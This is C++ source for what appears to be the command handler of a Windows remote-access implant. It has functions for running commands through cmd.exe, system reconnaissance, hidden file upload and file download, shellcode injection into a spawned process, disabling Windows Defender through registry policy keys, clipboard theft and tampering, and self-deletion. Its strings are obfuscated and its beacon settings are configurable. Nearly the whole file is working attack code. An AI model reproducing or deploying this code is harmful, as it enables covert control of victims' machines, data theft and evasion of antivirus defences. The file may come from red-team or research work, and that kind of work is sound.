#include <windows.h>
#include <winsock.h>
#include <compressapi.h>
#include "command.h"
#include "debug.h"
#include "profile.h"
#include "utils.h"
#include <shlwapi.h>
#include <map>
#include <psapi.h>
#include "crypto.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h"
#include "rapidjson/stringbuffer.h"
#include "obfuscator/MetaString.h"
//#include <Lmcons.h>
using namespace andrivet::ADVobfuscator;


LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut) {
    // szCmdLine should fit in cmd.exe /c <szCmdLine>
    DEBUG_PRINTF("Executing command: %s\n", szCmdline);
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hPipeRead, hPipeWrite;
    BYTE buffer[4096];
    DWORD dwRead, dwWritten;
    LPBYTE outputBuffer = NULL;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0)) {
        DEBUG_PRINTF("Error creating pipe: %d\n", GetLastError());
        return NULL;
    }

    STARTUPINFO siStartInfo;
    PROCESS_INFORMATION piProcInfo;

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hPipeWrite;
    siStartInfo.hStdOutput = hPipeWrite;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Set up full command line
    // cmd.exe /c <szCmdLine>
    char fullCmdLine[4096];
    strcpy(fullCmdLine, OBFUSCATED("cmd.exe /c "));
    strcat(fullCmdLine, szCmdline);

    if (!CreateProcess(NULL, (LPSTR)fullCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        DEBUG_PRINTF("Error creating process: %d\n", GetLastError());
        CloseHandle(hPipeRead);
        CloseHandle(hPipeWrite);
        return NULL;
    }

    CloseHandle(hPipeWrite);

    do {
        if (!ReadFile(hPipeRead, buffer, sizeof(buffer), &dwRead, NULL) || dwRead == 0) break;
        outputBuffer = (LPBYTE)realloc(outputBuffer, *stOut + dwRead);
        if (outputBuffer == NULL) {
            DEBUG_PRINTF("Error allocating memory\n");
            CloseHandle(hPipeRead);
            return NULL;
        }
        memcpy(outputBuffer + *stOut, buffer, dwRead);
        *stOut += dwRead;
    } while (true);

    CloseHandle(hPipeRead);
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

    return outputBuffer;
}

LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize)
{
    std::string cmdLine = "";
    for (auto arg : args) {
        cmdLine += arg + " ";
    }
    return ExecuteCmd(cmdLine.c_str(), outSize);
}

/**
 * Stop this process and remove it from the system
*/
void SelfDestruct()
{
    // get file path, if applicable
    char filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH);

    // delete file
    DEBUG_PRINTF("Deleting file: %s\n", filePath);
    DeleteFile(filePath);

    // get process handle
    HANDLE hProcess = GetCurrentProcess();

    // terminate process
    TerminateProcess(hProcess, 0);

    // close process handle
    CloseHandle(hProcess);

    // exit
    exit(0);

}

/**
 * Get basic system information about this system
*/
std::string SysInfo()
{

    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameA(computerName, &size);

    // Get username
    char userName[4096];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    GetUserName(userName, &userNameSize);


    // Get OS version
    OSVERSIONINFOEX osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);

    // Get system info
    SYSTEM_INFO sysInfo;
    ZeroMemory(&sysInfo, sizeof(SYSTEM_INFO));
    GetSystemInfo(&sysInfo);

    // Get machine GUID from Registry
    HKEY hKey;
    char guid[256];
    DWORD guidSize = sizeof(guid);
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, OBFUSCATED("SOFTWARE\\Microsoft\\Cryptography"), 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        RegQueryValueEx(hKey, OBFUSCATED("MachineGuid"), NULL, NULL, (LPBYTE)&guid, &guidSize);
        RegCloseKey(hKey);
    }

    // Get private IP
    char hostName[256];
    gethostname(hostName, sizeof(hostName));
    hostent* host = gethostbyname(hostName);
    char* ip = inet_ntoa(*(struct in_addr*)*host->h_addr_list);

    rapidjson::Document results;
    results.SetObject();
    rapidjson::Document::AllocatorType& allocator = results.GetAllocator();

    results.AddMember("computerName", rapidjson::Value(computerName, allocator), allocator);
    results.AddMember("userName", rapidjson::Value(userName, allocator), allocator);
    results.AddMember("osVersion", rapidjson::Value((unsigned int)osInfo.dwMajorVersion), allocator);
    results.AddMember("osBuild", rapidjson::Value((unsigned int)osInfo.dwBuildNumber), allocator);
    results.AddMember("osPlatform", rapidjson::Value((unsigned int)sysInfo.wProcessorArchitecture), allocator);
    results.AddMember("numProcessors", rapidjson::Value((unsigned int)sysInfo.dwNumberOfProcessors), allocator);
    results.AddMember("machineGuid", rapidjson::Value(guid, allocator), allocator);
    results.AddMember("privateIp", rapidjson::Value(ip, allocator), allocator);

    rapidjson::StringBuffer buffer;
    rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
    results.Accept(writer);

    return buffer.GetString();

}


void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) {
    rapidjson::Value::ConstMemberIterator itr = changes->MemberBegin();
    for (; itr != changes->MemberEnd(); ++itr) {
        if (itr->name == OBFUSCATED("sleep_time")) {
            currentProfile->sleep = itr->value.GetInt();
        }
        else if (itr->name == OBFUSCATED("user_agent")) {
            currentProfile->userAgent = itr->value.GetString();
        }
        else if (itr->name == OBFUSCATED("jitter")) {
            currentProfile->jitter = itr->value.GetFloat();
        }
        else if (itr->name == OBFUSCATED("max_retries")) {
            currentProfile->maxRetries = itr->value.GetInt();
        }
        else if (itr->name == OBFUSCATED("auto_self_destruct")) {
            currentProfile->autoSelfDestruct = itr->value.GetBool();
        }
        else if (itr->name == OBFUSCATED("retry_wait")) {
            currentProfile->retryWait = itr->value.GetInt();
        }
        else if (itr->name == OBFUSCATED("retry_jitter")) {
            currentProfile->retryJitter = itr->value.GetFloat();
        }
        else if (itr->name == OBFUSCATED("tailoring_hashes")) {
            currentProfile->tailoringHashes = std::vector<std::string>();
            for (auto& hash : itr->value.GetArray()) {
                currentProfile->tailoringHashes.push_back(hash.GetString());
            }
        }
        else if (itr->name == OBFUSCATED("tailoring_hash_function")) {
            std::string hashFunction = itr->value.GetString();
            if (!(hashFunction == OBFUSCATED("sha256") || hashFunction == OBFUSCATED("md5"))) {
                DEBUG_PRINTF("Invalid hash function: %s\n", hashFunction.c_str());
            }
            else {
                currentProfile->tailoringHashFunction = hashFunction;
            }
        }
        else if (itr->name == OBFUSCATED("tailoring_hash_rounds")) {
            currentProfile->tailoringHashRounds = itr->value.GetInt();
        }
    }
}

std::string Upload(std::string fileName, std::string b64Contents) {
    std::vector<BYTE> bytes = base64Decode(b64Contents);

    HANDLE hFile = CreateFileA(fileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return "ERROR: INVALID HANDLE";
    }

    LPDWORD out_size;

    // Write file bytes
    if(!WriteFile(hFile, bytes.data(), bytes.size(), out_size, NULL))
    {
        return "ERROR: WRITE FAILED";
    }

    CloseHandle(hFile);

    return fileName;
}

std::string Download(std::string filepath) {
    DWORD file_attr = GetFileAttributesA(filepath.c_str());

    if (file_attr == INVALID_FILE_ATTRIBUTES) {
        return "ERROR: INVALID FILE ATTRIBUTES";
    }
    if (file_attr & FILE_ATTRIBUTE_DIRECTORY) {
        return "ERROR: IS DIRECTORY";
    }
    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return "ERROR: INVALID HANDLE";
    }

    LARGE_INTEGER size;
    DWORD lower = GetFileSizeEx(hFile, &size);
    if (size.QuadPart >= 1000000000) {
        return "ERROR: TOO BIG";
    }
    BYTE* raw_buffer = (BYTE*)malloc(size.QuadPart);
    if (raw_buffer == NULL) {
        return "ERROR: CANNOT ALLOCATE";
    }
    memset(raw_buffer, 0, size.QuadPart);
    DWORD bytes_read;
    if (ReadFile(hFile, raw_buffer, size.QuadPart, &bytes_read, NULL) == 0) {
        return "ERROR: CANNOT READ";
    }
    std::vector<BYTE> vec;
    vec.reserve(bytes_read);
    vec.assign(raw_buffer, raw_buffer + bytes_read);
    
    // Base64 encode the byte vector
    //std::string encoded = base64Encode(vec);

    free(raw_buffer);
    CloseHandle(hFile);
    return std::string(vec.begin(), vec.end());
}

std::string Inject(std::string b64shellcode, std::string processName) {
    std::vector<BYTE> shellcode = base64Decode(b64shellcode);
    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION process_info;

    memset(&processHandle, 0, sizeof(processHandle));
    memset(&startupInfo, 0, sizeof(startupInfo));

    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = 1;
    startupInfo.wShowWindow = 0;

    if (CreateProcessA(NULL, (LPSTR)(processName.c_str()), NULL, NULL, 0, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &process_info) == 0) {
        return "ERROR";
    }
    CloseHandle(process_info.hThread);
    remoteBuffer = VirtualAllocEx(process_info.hProcess, NULL, shellcode.size() * sizeof(BYTE), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (remoteBuffer == NULL) {
        CloseHandle(process_info.hProcess);
        return "ERROR";
    }
    if (WriteProcessMemory(process_info.hProcess, remoteBuffer, &shellcode[0], shellcode.size() * sizeof(BYTE), NULL) == 0) {
        CloseHandle(process_info.hProcess);
        return "ERROR";
    }
    remoteThread = CreateRemoteThread(process_info.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (remoteThread == NULL) {
        CloseHandle(process_info.hProcess);
        return "ERROR";
    }
    CloseHandle(process_info.hProcess);
    return "OK";
}

bool ChangeDir(std::string path) {
    return SetCurrentDirectoryA(path.c_str());
}

std::string GetDir() {
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    return std::string(buffer);
}

std::map<std::string, std::string> GetAllEnvVars()
{
    std::map<std::string, std::string> envVars;
    char* env = GetEnvironmentStrings();
    if (env == nullptr) {
        return envVars; // return empty map if GetEnvironmentStrings() fails
    }

    for (char* var = env; *var != '\0'; var++) {
        std::string envVar(var);
        std::string::size_type pos = envVar.find('=');
        if (pos != std::string::npos) {
            std::string name = envVar.substr(0, pos);
            std::string value = envVar.substr(pos + 1);
            envVars[name] = value;
        }
    }

    FreeEnvironmentStrings(env);
    return envVars;
}

std::vector<std::string> GetAllFilesInCurrentDirectory()
{
    std::vector<std::string> files;

    WIN32_FIND_DATAA fileData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    char currentDir[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, currentDir);

    std::string searchPath(currentDir);
    searchPath.append("\\*.*");

    hFind = FindFirstFileA(searchPath.c_str(), &fileData);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            std::string fName(fileData.cFileName);

            if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                // Add a slash to the end of the directory name
                fName.append("\\");
            }

            files.push_back(fName);

        } while (FindNextFileA(hFind, &fileData) != 0);

        FindClose(hFind);
    }

    return files;
}

std::map<std::string, DWORD> GetProcessNameToPIDMap()
{
    std::map<std::string, DWORD> processMap;
    DWORD processIDs[1024], bytesNeeded;

    if (EnumProcesses(processIDs, sizeof(processIDs), &bytesNeeded)) {
        const DWORD numProcesses = bytesNeeded / sizeof(DWORD);

        for (DWORD i = 0; i < numProcesses; ++i) {
            HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIDs[i]);
            if (processHandle) {
                CHAR processName[MAX_PATH];
                if (GetModuleBaseNameA(processHandle, nullptr, processName, sizeof(processName))) {
                    processMap[processName] = processIDs[i];
                }
                CloseHandle(processHandle);
            }
        }
    }

    return processMap;
}

std::string Whoami() {
    char userName[4096];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    GetUserName(userName, &userNameSize);
    return std::string(userName);
}


/**
 * https://github.com/Nolan-Burkhart/defender-disabler/blob/master/virus-disabler/main.cpp
*/
BOOL DisableDefender() {
    if (!IsAdmin()){
        return FALSE;
    }

    HKEY key;

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, OBFUSCATED("SOFTWARE\\Policies\\Microsoft\\Windows Defender"), 0, KEY_ALL_ACCESS, &key)) {
		return FALSE;
	}

    uint32_t payload = 1;
	if (RegSetValueEx(key, OBFUSCATED("DisableAntiSpyware"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
		return FALSE;
	}

    HKEY new_key;
	if (RegCreateKeyEx(key, OBFUSCATED("Real-Time Protection"), 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0, &new_key, 0)) {
		return FALSE;
	}
	key = new_key;

    if (RegSetValueEx(key, OBFUSCATED("DisableRealtimeMonitoring"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
		return FALSE;
	}

	if (RegSetValueEx(key, OBFUSCATED("DisableBehaviorMonitoring"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
		return FALSE;
	}

	if (RegSetValueEx(key, OBFUSCATED("DisableOnAccessProtection"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
		return FALSE;
	}

	if (RegSetValueEx(key, OBFUSCATED("DisableScanOnRealtimeEnable"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
		return FALSE;
	}

	if (RegSetValueEx(key, OBFUSCATED("DisableIOAVProtection"), 0, REG_DWORD, (LPBYTE)&payload, sizeof(payload))) {
		return FALSE;
	}

    RegCloseKey(key);
    return TRUE;
}

std::string GetClipboard() {
    if (!OpenClipboard(NULL)) {
        return "ERROR: OPEN CLIPBOARD";
    }

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == NULL) {
        return "ERROR: GET CLIPBOARD DATA";
    }

    char* pszText = static_cast<char*>(GlobalLock(hData));
    if (pszText == NULL) {
        return "ERROR: GLOBAL LOCK";
    }

    std::string clipboardText(pszText);

    GlobalUnlock(hData);
    CloseClipboard();

    return clipboardText;
}

void SetClipboard(std::string contents) {
    if (!OpenClipboard(NULL)) {
        return;
    }

    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, contents.size() + 1);
    if (hMem == NULL) {
        return;
    }

    memcpy(GlobalLock(hMem), contents.c_str(), contents.size() + 1);
    GlobalUnlock(hMem);

    EmptyClipboard();
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
}